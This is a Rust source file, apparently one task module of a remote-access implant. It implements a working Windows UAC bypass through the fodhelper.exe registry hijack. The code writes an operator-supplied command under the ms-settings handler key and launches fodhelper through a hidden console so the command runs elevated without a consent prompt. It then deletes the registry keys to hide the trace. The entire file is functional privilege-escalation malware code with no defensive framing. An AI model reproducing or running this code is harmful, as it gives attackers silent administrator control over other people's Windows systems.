/// UAC Bypass using fodhelper.exe technique.
/// Works on Windows 10/11 with default UAC settings.

use super::TaskResult;

pub fn run(task_id: i64, args: &serde_json::Value) -> TaskResult {
    #[cfg(target_os = "windows")]
    {
        run_windows(task_id, args)
    }
    #[cfg(not(target_os = "windows"))]
    {
        TaskResult::error(task_id, "UAC bypass only available on Windows".to_string())
    }
}

#[cfg(target_os = "windows")]
fn run_windows(task_id: i64, args: &serde_json::Value) -> TaskResult {
    use winapi::um::winreg::*;
    use winapi::um::winnt::*;
    use winapi::shared::minwindef::HKEY;
    use std::ptr;

    let default_exe = std::env::current_exe()
        .map(|p| p.to_string_lossy().to_string())
        .unwrap_or_default();

    let command = args.get("cmd").and_then(|v| v.as_str()).unwrap_or(&default_exe);

    if command.is_empty() {
        return TaskResult::error(task_id, "no command and cannot determine exe path".to_string());
    }

    let reg_path = "Software\\Classes\\ms-settings\\shell\\open\\command";

    unsafe {
        let mut hkey: HKEY = ptr::null_mut();
        let path_wide: Vec<u16> = reg_path.encode_utf16().chain(std::iter::once(0)).collect();
        let mut disposition: u32 = 0;

        let result = RegCreateKeyExW(
            HKEY_CURRENT_USER,
            path_wide.as_ptr(),
            0,
            ptr::null_mut(),
            REG_OPTION_NON_VOLATILE,
            KEY_ALL_ACCESS,
            ptr::null_mut(),
            &mut hkey,
            &mut disposition,
        );

        if result != 0 {
            return TaskResult::error(task_id, format!("registry key create failed: {}", result));
        }

        // Set default value to our command
        let cmd_wide: Vec<u16> = command.encode_utf16().chain(std::iter::once(0)).collect();
        RegSetValueExW(
            hkey,
            ptr::null(),
            0,
            REG_SZ,
            cmd_wide.as_ptr() as *const u8,
            (cmd_wide.len() * 2) as u32,
        );

        // Set DelegateExecute to empty string (required)
        let delegate_name: Vec<u16> = "DelegateExecute".encode_utf16().chain(std::iter::once(0)).collect();
        let empty_wide: Vec<u16> = vec![0];
        RegSetValueExW(
            hkey,
            delegate_name.as_ptr(),
            0,
            REG_SZ,
            empty_wide.as_ptr() as *const u8,
            2,
        );

        RegCloseKey(hkey);

        // Launch fodhelper.exe (auto-elevates)
        let mut cmd_proc = crate::utils::helpers::hidden_command("cmd.exe");
        cmd_proc.args(["/c", "start", "fodhelper.exe"]);
        let launch_result = cmd_proc.spawn();

        // Wait for fodhelper to execute
        std::thread::sleep(std::time::Duration::from_secs(3));

        // Clean up registry
        for path in &[
            "Software\\Classes\\ms-settings\\shell\\open\\command",
            "Software\\Classes\\ms-settings\\shell\\open",
            "Software\\Classes\\ms-settings\\shell",
            "Software\\Classes\\ms-settings",
        ] {
            let p: Vec<u16> = path.encode_utf16().chain(std::iter::once(0)).collect();
            RegDeleteKeyW(HKEY_CURRENT_USER, p.as_ptr());
        }

        match launch_result {
            Ok(_) => TaskResult::success(task_id, format!("UAC bypass executed: {}", command)),
            Err(e) => TaskResult::error(task_id, format!("fodhelper launch failed: {}", e)),
        }
    }
}
